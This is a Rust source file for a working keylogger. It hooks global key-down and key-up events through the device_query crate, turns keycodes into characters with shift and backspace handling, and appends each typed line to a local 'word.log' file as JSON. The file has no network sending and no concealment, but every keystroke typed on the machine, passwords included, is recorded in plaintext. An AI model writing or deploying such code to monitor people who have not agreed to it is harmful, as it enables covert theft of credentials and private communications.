use device_query::Keycode;
use device_query::{DeviceEvents, DeviceState};
use std::cmp::{Ord, Ordering};
use std::collections::HashMap;
use std::fmt;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::Write;
use std::sync::atomic::AtomicBool;
use std::sync::atomic::Ordering::Acquire;
use std::sync::atomic::Ordering::Relaxed;
use std::sync::mpsc;
use std::sync::Arc;
use std::sync::LazyLock;
use std::sync::Mutex;
use std::thread;

pub struct KeyLogger {
    recorder: Arc<Mutex<Recorder>>,
}
impl KeyLogger {
    fn new(file: File) -> Self {
        Self {
            recorder: Arc::new(Mutex::new(Recorder::new(file))),
        }
    }

    pub fn run() {
        let device_state = DeviceState::new();

        let logpath = "word.log";
        let logfile: File = OpenOptions::new()
            .create(true)
            .append(true)
            .open(logpath)
            .expect("Failed to open file");

        let key_logger = KeyLogger::new(logfile);

        let (tx, rx) = mpsc::channel::<Keycode>();

        let tx_clone = tx.clone();
        let device_state_clone = device_state.clone();
        thread::spawn(move || {
            let _guard = device_state_clone.on_key_down(move |key| {
                tx_clone.send(*key).expect("Failed to send key down event");
            });
            loop {}
        });

        thread::spawn(move || {
            let _guard = device_state.on_key_up(move |key| match key {
                Keycode::LShift | Keycode::RShift => {
                    tx.send(*key).expect("Failed to send key up event")
                }
                _ => (),
            });
            loop {}
        });

        let recorder = Arc::clone(&key_logger.recorder);
        loop {
            while let Ok(key) = rx.recv() {
                let mut recorder = recorder.lock().unwrap();
                recorder.record(&key);
            }
        }
    }
}

static DEFAULT_KEY: LazyLock<HashMap<Keycode, &'static str>> = LazyLock::new(|| {
    use Keycode::*;

    let mut map: HashMap<Keycode, &str> = HashMap::new();
    map.insert(Minus, "-");
    map.insert(Equal, "=");
    map.insert(LeftBracket, "[");
    map.insert(RightBracket, "]");
    map.insert(Semicolon, ";");
    map.insert(Apostrophe, "'");
    map.insert(BackSlash, "\\");
    map.insert(Comma, ",");
    map.insert(Dot, ".");
    map.insert(Slash, "/");
    map.insert(Space, " ");
    map.insert(Key0, "0");
    map.insert(Key1, "1");
    map.insert(Key2, "2");
    map.insert(Key3, "3");
    map.insert(Key4, "4");
    map.insert(Key5, "5");
    map.insert(Key6, "6");
    map.insert(Key7, "7");
    map.insert(Key8, "8");
    map.insert(Key9, "9");

    map.insert(A, "a");
    map.insert(B, "b");
    map.insert(C, "c");
    map.insert(D, "d");
    map.insert(E, "e");
    map.insert(F, "f");
    map.insert(G, "g");
    map.insert(H, "h");
    map.insert(I, "i");
    map.insert(J, "j");
    map.insert(K, "k");
    map.insert(L, "l");
    map.insert(M, "m");
    map.insert(N, "n");
    map.insert(O, "o");
    map.insert(P, "p");
    map.insert(Q, "q");
    map.insert(R, "r");
    map.insert(S, "s");
    map.insert(T, "t");
    map.insert(U, "u");
    map.insert(V, "v");
    map.insert(W, "w");
    map.insert(X, "x");
    map.insert(Y, "y");
    map.insert(Z, "z");

    map.insert(LControl, "");
    map.insert(RControl, "");
    map.insert(Up, "");
    map.insert(Down, "");
    map.insert(Left, "");
    map.insert(Right, "");

    map
});

static SHIFTED_KEY: LazyLock<HashMap<Keycode, &'static str>> = LazyLock::new(|| {
    use Keycode::*;
    let mut map: HashMap<Keycode, &str> = HashMap::new();

    map.insert(Minus, "_");
    map.insert(Equal, "+");
    map.insert(LeftBracket, "{");
    map.insert(RightBracket, "}");
    map.insert(Semicolon, ":");
    map.insert(Apostrophe, "\"");
    map.insert(BackSlash, "|");
    map.insert(Comma, "<");
    map.insert(Dot, ">");
    map.insert(Slash, "?");
    map.insert(Space, " ");
    map.insert(Key0, ")");
    map.insert(Key1, "!");
    map.insert(Key2, "@");
    map.insert(Key3, "#");
    map.insert(Key4, "$");
    map.insert(Key5, "%");
    map.insert(Key6, "^");
    map.insert(Key7, "&");
    map.insert(Key8, "*");
    map.insert(Key9, "(");

    map.insert(A, "A");
    map.insert(B, "B");
    map.insert(C, "C");
    map.insert(D, "D");
    map.insert(E, "E");
    map.insert(F, "F");
    map.insert(G, "G");
    map.insert(H, "H");
    map.insert(I, "I");
    map.insert(J, "J");
    map.insert(K, "K");
    map.insert(L, "L");
    map.insert(M, "M");
    map.insert(N, "N");
    map.insert(O, "O");
    map.insert(P, "P");
    map.insert(Q, "Q");
    map.insert(R, "R");
    map.insert(S, "S");
    map.insert(T, "T");
    map.insert(U, "U");
    map.insert(V, "V");
    map.insert(W, "W");
    map.insert(X, "X");
    map.insert(Y, "Y");
    map.insert(Z, "Z");

    map.insert(LControl, "");
    map.insert(RControl, "");
    map.insert(Up, "");
    map.insert(Down, "");
    map.insert(Left, "");
    map.insert(Right, "");

    map
});

enum Letter {
    Alphabet(String),
    Symbol(String),
}

impl Letter {
    fn inner(&self) -> &String {
        match *self {
            Letter::Symbol(ref inner) => inner,
            Letter::Alphabet(ref inner) => inner,
        }
    }

    fn inner_clone(&self) -> String {
        self.inner().clone()
    }

    fn to_string(&self) -> String {
        self.inner_clone()
    }
}

impl PartialEq for Letter {
    fn eq(&self, other: &Self) -> bool {
        self.inner() == other.inner()
    }
}

impl Eq for Letter {}

impl PartialOrd for Letter {
    fn partial_cmp(&self, other: &Self) -> Option<Ordering> {
        Some(self.cmp(other))
    }
}

impl Ord for Letter {
    fn cmp(&self, other: &Self) -> Ordering {
        self.inner().cmp(other.inner())
    }
}

impl fmt::Display for Letter {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.to_string())
    }
}

pub struct Recorder {
    file: File,
    word: Arc<Mutex<Vec<Letter>>>,
    shift: AtomicBool,
}

impl Recorder {
    pub fn new(file: File) -> Recorder {
        Recorder {
            file,
            word: Arc::new(Mutex::new(Vec::new())),
            shift: AtomicBool::new(false),
        }
    }

    pub fn record(&mut self, key: &Keycode) {
        match key {
            Keycode::LShift | Keycode::RShift => self.toggle_shift(),
            Keycode::Enter => self.write_to_file(),
            Keycode::Backspace => self.pop(),
            _ => {
                let letter = self.parse_key(key);
                self.push(letter);
            }
        }
    }

    fn toggle_shift(&self) {
        let mut current: bool = self.shift.load(Relaxed);
        loop {
            match self
                .shift
                .compare_exchange(current, !current, Acquire, Relaxed)
            {
                Ok(_) => break,
                Err(new_value) => current = new_value,
            }
        }
    }

    fn write_to_file(&mut self) {
        let _ = writeln!(self.file, "{{\"line\":\"{}\"}}", self.word_to_string());
        self.clear();
    }

    fn word_to_string(&self) -> String {
        let mut word_str = String::new();
        for letter in self.word.lock().unwrap().iter() {
            word_str.push_str(&letter.to_string());
        }
        word_str
    }

    fn parse_key(&self, key: &Keycode) -> Letter {
        let mut is_symbol = true;
        let chara = if self.shift.load(Acquire) {
            if let Some(key) = SHIFTED_KEY.get(key) {
                *key
            } else {
                is_symbol = false;
                &format!("{}", key).to_uppercase()
            }
        } else {
            if let Some(key) = DEFAULT_KEY.get(key) {
                *key
            } else {
                is_symbol = false;
                &format!("{}", key).to_lowercase()
            }
        };

        if is_symbol {
            Letter::Symbol(chara.to_string())
        } else {
            Letter::Alphabet(chara.to_string())
        }
    }

    fn pop(&mut self) {
        self.word.lock().unwrap().pop();
    }

    fn push(&mut self, letter: Letter) {
        self.word.lock().unwrap().push(letter);
    }

    fn clear(&mut self) {
        self.word.lock().unwrap().clear()
    }
}
